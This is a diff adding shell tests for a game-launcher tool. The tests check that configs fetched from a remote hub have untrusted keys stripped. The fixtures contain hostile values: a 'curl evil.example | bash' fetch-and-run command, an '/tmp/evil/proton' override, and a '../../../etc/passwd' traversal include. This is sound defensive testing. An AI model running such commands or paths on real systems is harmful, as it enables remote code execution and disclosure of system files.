@@ -38,6 +38,74 @@ teardown() {
 	[[ "$output" == ok ]]
 }
 
+@test "hub_sanitize_remote_env_file strips untrusted exec keys" {
+	local tmp
+	tmp="$(mktemp)"
+	cat > "$tmp" <<'EOF'
+INCLUDE=presets/standard.env
+GAMEMODE=1
+PRE_LAUNCH_CMD=curl evil.example | bash
+POST_LAUNCH_CMD=
+LAUNCH_WRAPPERS=gamescope
+EOF
+	run bash -c '
+		export CONFIG_DIR="'"$CONFIG_DIR"'"
+		source "'"$BATS_TEST_DIRNAME"'/../helpers.bash"
+		source_lib keys config commands hub
+		hub_sanitize_remote_env_file "'"$tmp"'" 2>&1
+		echo "---"
+		cat "'"$tmp"'"
+	'
+	[[ $status -eq 0 ]]
+	[[ "$output" == *"Stripped untrusted hub keys"* ]]
+	[[ "$output" == *"PRE_LAUNCH_CMD"* ]]
+	[[ "$output" == *"LAUNCH_WRAPPERS"* ]]
+	[[ "$output" == *"GAMEMODE=1"* ]]
+	[[ "$output" == *"INCLUDE=presets/standard.env"* ]]
+	[[ "$output" != *"curl evil.example"* ]]
+	[[ "$output" == *"POST_LAUNCH_CMD="* ]]
+	rm -f "$tmp"
+}
+
+@test "hub_assert_publish_env_safe rejects untrusted keys" {
+	local tmp
+	tmp="$(mktemp)"
+	printf '%s\n' 'GAMEMODE=1' 'OVERRIDE_PROTON=/tmp/evil/proton' > "$tmp"
+	run bash -c '
+		export CONFIG_DIR="'"$CONFIG_DIR"'"
+		source "'"$BATS_TEST_DIRNAME"'/../helpers.bash"
+		source_lib keys config commands hub
+		hub_assert_publish_env_safe "'"$tmp"'" 2>&1
+	'
+	[[ $status -ne 0 ]]
+	[[ "$output" == *"Cannot publish"* ]]
+	[[ "$output" == *"OVERRIDE_PROTON"* ]]
+	rm -f "$tmp"
+}
+
+@test "hub_sanitize_remote_env_file strips unsafe INCLUDE paths" {
+	local tmp
+	tmp="$(mktemp)"
+	cat > "$tmp" <<'EOF'
+INCLUDE=../../../etc/passwd
+GAMEMODE=1
+EOF
+	run bash -c '
+		export CONFIG_DIR="'"$CONFIG_DIR"'"
+		source "'"$BATS_TEST_DIRNAME"'/../helpers.bash"
+		source_lib keys config commands hub
+		hub_sanitize_remote_env_file "'"$tmp"'" 2>&1
+		echo "---"
+		cat "'"$tmp"'"
+	'
+	[[ $status -eq 0 ]]
+	[[ "$output" == *"Stripped untrusted hub keys"* ]]
+	[[ "$output" == *"GAMEMODE=1"* ]]
+	# Sanitized file must not retain the traversal INCLUDE line.
+	! grep -q 'INCLUDE=' "$tmp"
+	rm -f "$tmp"
+}
+
 @test "hub_sync_one_game uploads via mock and sets HUB_SYNC_UPDATED" {
 	local fp='{"gpu_vendor":"nvidia","os_family":"arch","session_type":"wayland","profiles":[],"display_tier":"1440p","vrr":false,"wsl2":false,"flatpak_steam":false,"steam_deck":false,"immutable":false,"container":false}'
 	run env XDG_CONFIG_HOME="$HUB_TMP" bash -c '
